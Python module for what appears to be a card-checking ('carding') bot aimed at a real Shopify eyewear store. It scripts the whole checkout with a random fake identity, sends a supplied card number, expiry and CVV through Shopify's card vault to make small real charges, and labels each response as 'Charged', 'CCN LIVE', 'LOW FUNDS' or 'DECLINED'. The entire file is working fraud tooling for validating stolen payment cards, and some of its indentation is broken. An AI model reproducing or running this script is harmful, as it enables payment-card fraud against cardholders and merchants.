import os
import time
from .rand_user import random_user_api
from ..filters.checker_defs import find_between

def one(r):
    a = r.get('https://blueplaneteyewear.com/products/lanyard-5')
    varient_id = find_between(a.text, 'variantId":',',')
    return varient_id if varient_id else False



def two(r):
    b_headers= {
'authority': 'blueplaneteyewear.com',
'method': 'POST',
'path': '/cart/add',
'scheme': 'https',
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
'cache-control': 'max-age=0',
'content-length': '440',
'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary7xxGPTu9qqAxyonX',
'origin': 'https://blueplaneteyewear.com',
'referer': 'https://blueplaneteyewear.com/products/lanyard-5',
'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Windows"',
'sec-fetch-dest': 'document',
'sec-fetch-mode': 'navigate',
'sec-fetch-site': 'same-origin',
'sec-fetch-user': '?1',
'upgrade-insecure-requests': '1',
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
}   
    with open('text_files/shi.txt', 'rb') as fileFp:
        fileInfoDict = {
        "file": fileFp,
    }
        b = r.post('https://blueplaneteyewear.com/cart/add', headers = b_headers,files = fileInfoDict)
        return False if b.status_code == 400 else True



def three(r):
    # c = r.get('https://blueplaneteyewear.com/cart')
    # if c.status_code != 200 :  return False
    d_data = {
'note': '',
'attributes[collection_products_per_page]': '',
'attributes[collection_layout]': '',
'checkout': '',
'discount': '',
'clear_discount': '1',
}

    d = r.post('https://blueplaneteyewear.com/cart', json = d_data)
    # with open('d.html', 'w', encoding='utf-8') as wr: wr.write(d.text)
    # sho_auth= find_between(d.text, 'name="shopify-checkout-authorization-token" content="', '"')
    auth_token = find_between(d.text, 'type="hidden" name="authenticity_token" value="','"')
    # checkout_id= find_between(d.text,'"checkoutToken":"','"')
    url = d.url.replace('?discount=', '')
    return (auth_token, url) if auth_token else False




def four(r,url,auth_token, rand_user):
    e_data = {
'_method': 'patch',
'authenticity_token': auth_token,
'previous_step': 'contact_information',
'step': 'shipping_method',
'checkout[email]': rand_user.email,
'checkout[buyer_accepts_marketing]': '0',
'checkout[shipping_address][first_name]': rand_user.first_name,
'checkout[shipping_address][last_name]': rand_user.last_name,
'checkout[shipping_address][company]': '',
'checkout[shipping_address][address1]': '3 allen street',
'checkout[shipping_address][address2]': '',
'checkout[shipping_address][city]': 'New York',
'checkout[shipping_address][country]': 'US',
'checkout[shipping_address][province]': 'New York',
'checkout[shipping_address][zip]': '10002',
'checkout[shipping_address][phone]': rand_user.phone,
'checkout[shipping_address][first_name]': rand_user.first_name,
'checkout[shipping_address][last_name]': rand_user.last_name,
'checkout[shipping_address][company]': '',
'checkout[shipping_address][address1]': '3 allen street',
'checkout[shipping_address][address2]': '',
'checkout[shipping_address][city]': 'New York',
'checkout[shipping_address][country]': 'United States',
'checkout[shipping_address][province]': 'NY',
'checkout[shipping_address][zip]': '10002',
'checkout[shipping_address][phone]': rand_user.phone,
'checkout[buyer_accepts_sms]': '0',
'checkout[sms_marketing_phone]': '',
'checkout[client_details][browser_width]': '765',
'checkout[client_details][browser_height]': '667',
'checkout[client_details][javascript_enabled]': '1',
'checkout[client_details][color_depth]': '24',
'checkout[client_details][java_enabled]': 'false',
'checkout[client_details][browser_tz]': '-330',
}
    e = r.post(url, data = e_data)
    if e.status_code != 200:
        return False
    f = r.get(url + '/shipping_rates?step=shipping_method')
    if f.status_code != 200:
        return False
    g_data = {
'_method': 'patch',
'authenticity_token': auth_token,
'previous_step': 'shipping_method',
'step': 'payment_method',
'checkout[shipping_rate][id]': 'shopify-Standard%20Shipping%20(Arrives%20in%204-7%20business%20days)-4.00',
'checkout[client_details][browser_width]': '782',
'checkout[client_details][browser_height]': '667',
'checkout[client_details][javascript_enabled]': '1',
'checkout[client_details][color_depth]': '24',
'checkout[client_details][java_enabled]': 'false',
'checkout[client_details][browser_tz]': '-330',
}
    g = r.post(url, data = g_data)
    if g.status_code != 200:
        return False
    h = r.get(g.url)
    if h.status_code != 200:
        return False
    payment_gateway = find_between(h.text,'data-subfields-for-gateway="','"')
    return False if not payment_gateway else payment_gateway


def five(r, payment_gateway, lista, rand_user,auth_token, url):
    cc,mes,ano,cvv = lista
        json_four = {
        "credit_card": {
            "number": cc,
            "name": rand_user.name,
            "month": mes,
            "year": ano,
            "verification_value": cvv
        },
        "payment_session_scope": "blueplaneteyewear.com"
    }

    four = r.post('https://deposit.us.shopifycs.com/sessions', json = json_four)
    if 'id' not in four.json(): return False
        g_data = {
    '_method': 'patch',
    'authenticity_token': auth_token,
    'previous_step': 'payment_method',
    'step': '',
    's': four.json()['id'],
    'checkout[payment_gateway]': payment_gateway,
    'checkout[credit_card][vault]': 'false',
    'checkout[different_billing_address]': 'false',
    'checkout[remember_me]': 'false',
    'checkout[remember_me]': '0',
    'checkout[vault_phone]': rand_user.phone,
    'checkout[post_purchase_page_requested]': '0',
    'checkout[total_price]': '800',
    'complete': '1',
    'checkout[client_details][browser_width]': '765',
    'checkout[client_details][browser_height]': '667',
    'checkout[client_details][javascript_enabled]': '1',
    'checkout[client_details][color_depth]': '24',
    'checkout[client_details][java_enabled]': 'false',
    'checkout[client_details][browser_tz]': '-330',
    }
    g = r.post(url, data = g_data)
    if g.status_code != 200:
        return False
    time.sleep(4)
    h = r.get(f'{g.url}?from_processing_page=1')
    if h.status_code != 200:
        return False
    i = r.get(f'{h.url}&validate=true')
    return False if i.status_code != 200 else i.text



def get_response_shi(text):
    if 'Thank you' in text or 'Your order is confirmed' in text:
        r_text, r_logo, r_respo = "Charged $4", "✅", 'Charged'
        return r_text, r_logo, r_respo,
    text1 = find_between(text, '<p class="notice__text">','</p></div></div>')
    text = text1 if text1 else text
    if 'ZIP code does not match billing address' in text or "2059" in text or "2060" in text :
        r_text, r_logo, r_respo = "ZIP INCORRECT", "✅", 'Charged'
    elif "2001"  in text:
        r_text, r_logo, r_respo = "LOW FUNDS", "✅", 'Charged'
    elif "Security code was not matched by the processor" in text:
        r_text, r_logo, r_respo = "CCN LIVE", "✅", 'CCN Match'
    elif '"seller_message": "Payment complete."' in text or '"cvc_check": "pass"' in text or 'thank_you' in text or '"type":"one-time"' in text or '"state": "succeeded"' in text or "Your payment has already been processed" in text or '"status": "succeeded"' in text or 'Thank' in text:
        r_text, r_logo, r_respo = "Charged $4", "✅", 'Charged'
    else:
        r_text, r_logo, r_respo = "DECLINED", "❌", 'Rejected'
    r_text1 = text1.replace('-','') if text1 else r_text
    return r_text1,r_logo,r_respo
